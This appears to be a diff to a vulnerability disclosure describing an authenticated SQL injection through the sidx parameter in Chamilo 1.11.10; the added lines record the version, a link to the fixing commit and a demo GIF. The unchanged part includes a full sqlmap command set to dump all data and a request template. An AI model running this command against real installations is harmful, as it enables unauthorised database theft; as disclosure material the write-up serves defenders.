@@ -1,5 +1,12 @@
 ## Time based and boolean based SQLi via the sidx parameter
 
+
+
+Authenticated: Yes
+
+Version: Chamilo 1.11.10
+
+
 The following command was used,
 ```python3 sqlmap.py -r chamilo --level 5 --risk 3 --tamper between,charencode --random-agent --dbms mysql -a```
 
@@ -32,4 +39,11 @@ Referer: http://<REPLACE ME>/main/session/session_list.php
 Cookie: <REPLACE ME>
 ```
 
+Fixed:
+https://github.com/chamilo/chamilo-lms/commit/58bbe957a416e56dd9e8d0c39fd7199a8f9aa615
+
+
 demo:
+
+![](https://github.com/4rdr/proofs/blob/main/gifs/chamilo-1.11.10.-authenticated-sqli-via-sidx.gif?)
+
